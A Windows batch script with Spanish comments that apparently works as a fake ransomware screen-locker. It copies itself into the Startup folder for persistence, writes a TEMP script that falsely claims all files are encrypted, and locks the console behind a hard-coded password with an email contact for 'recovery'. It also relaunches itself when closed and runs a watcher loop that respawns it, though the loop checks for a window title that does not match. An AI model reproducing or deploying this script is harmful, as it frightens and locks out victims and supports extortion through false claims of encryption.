@echo off
setlocal

:: Carpeta de inicio (Startup)
set "startup=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

:: Autocopiarse al inicio
if not exist "%startup%\lock.bat" (
    copy "%~f0" "%startup%\lock.bat" >nul
)

:: Ruta de caiste.bat en TEMP
set "caiste=%TEMP%\caiste.bat"

:: Crear caiste.bat si no existe
if not exist "%caiste%" (
    echo @echo off > "%caiste%"
    echo title ¡CAISTE! >> "%caiste%"
    echo mode con: cols=120 lines=30 >> "%caiste%"
    echo color 0c >> "%caiste%"
    echo cls >> "%caiste%"
    echo echo ============================= >> "%caiste%"
    echo echo     AS SIDO HACKED POR SOMBRA DE LOBO >> "%caiste%"
    echo echo ============================= >> "%caiste%"
    echo echo. >> "%caiste%"
    echo echo HEMOS CIFRADO TODOS TUS ARCHIVOS. NO INTENTES NADA. >> "%caiste%"
    echo pause >> "%caiste%"
    echo exit /b >> "%caiste%"
)

:: Contraseña
set "clave=artol3030movi60"

:: Lanzar el vigilante en paralelo
start "" cmd /c "%~f0" :vigilante

:: Pantalla principal
:pantalla
title SISTEM LOCK
mode con: cols=120 lines=30
color 0c
cls

:bucle
cls
echo =========================================
echo     ABLE A alvaroandreswailmatech@gmail.com para recuperar la cuenta
echo =========================================
echo.
set /p pass=Ingrese la contraseña:

if "%pass%"=="%clave%" goto correcto

:: Si intentan cerrar la ventana, relanzar otra
start "" "%~f0"
exit
goto bucle

:correcto
cls
echo Acceso concedido.
:: Borrar archivos temporales y del startup
if exist "%startup%\lock.bat" del "%startup%\lock.bat" >nul 2>&1
if exist "%caiste%" del "%caiste%" >nul 2>&1
pause
exit

:vigilante
:: Este bloque se ejecuta solo como vigilante
:vig_loop
timeout /t 1 >nul
tasklist /fi "windowtitle eq SISTEMA PROTEGIDO" | find /i "cmd.exe" >nul
if errorlevel 1 (
    :: Si no encuentra la ventana principal, relanza
    start "" "%~f0"
)
goto vig_loop